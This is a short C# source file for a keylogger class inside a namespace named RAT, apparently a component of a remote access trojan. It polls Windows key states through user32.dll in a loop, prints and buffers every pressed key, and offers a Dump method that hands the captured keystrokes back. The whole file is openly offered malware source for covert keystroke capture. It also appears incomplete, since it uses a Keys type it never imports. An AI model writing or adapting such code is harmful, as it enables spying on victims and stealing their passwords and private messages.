using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;

namespace RAT {
	class KeyLogger {
		[DllImport("user32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);

		StringBuilder sb = new StringBuilder();
		bool running = true;

		void Start() {
			running = true;

			while (running) {
				Thread.Sleep(17);
				for (Int32 i = 0; i < 255; i++) {
					int state = GetAsyncKeyState(i);
					if (state == 1 || state == -32767) {
						Console.WriteLine((Keys) i);
						sb.Append((Keys) i);
						break;
					}
				}
			}
		}

		string Dump() {
			running = false;
			string capturedKeys = sb.ToString();
			sb.Clear();
			return capturedKeys;
		}
	}
}